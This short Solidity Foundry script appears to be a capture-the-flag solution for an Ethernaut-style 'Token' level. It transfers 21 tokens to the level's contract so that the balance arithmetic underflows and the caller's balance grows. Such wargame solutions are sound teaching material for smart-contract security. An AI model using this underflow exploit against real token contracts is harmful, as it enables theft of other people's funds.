// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel05.sol";
import {Script, console} from "forge-std/Script.sol";

contract POC is Script {
    Token level5 = Token(0xb364AC25023f1859df404e4AE9aeC80Ab425b0C7);

    function run() external {
        vm.startBroadcast();

        console.log(msg.sender);
        console.log("Current balance is :", level5.balanceOf(msg.sender));
        level5.transfer(0xb364AC25023f1859df404e4AE9aeC80Ab425b0C7, 21);
        console.log("New balance is :", level5.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
